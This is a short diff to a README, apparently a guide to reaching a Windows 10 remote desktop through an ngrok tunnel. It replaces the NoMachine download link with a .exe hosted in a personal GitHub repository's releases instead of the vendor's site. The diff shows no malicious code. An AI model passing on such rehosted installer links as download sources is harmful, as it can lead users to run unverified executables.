@@ -36,7 +36,7 @@ You’ll need ngrok to expose your RDP session securely.
 To access your Windows 10 RDP:
 
 1. Download and install NoMachine:  
-   🔗 [Nomachine](https://10drives.com/b/MdaUaaFyxxrEkdFxbd)  
+   🔗 [Nomachine](https://github.com/iemabdullah/win-10/releases/download/abdullahcoded/nomachine_9.1.24_6_x64.exe)  
 2. Open the app and connect using your ngrok tunnel address.
 
 ---
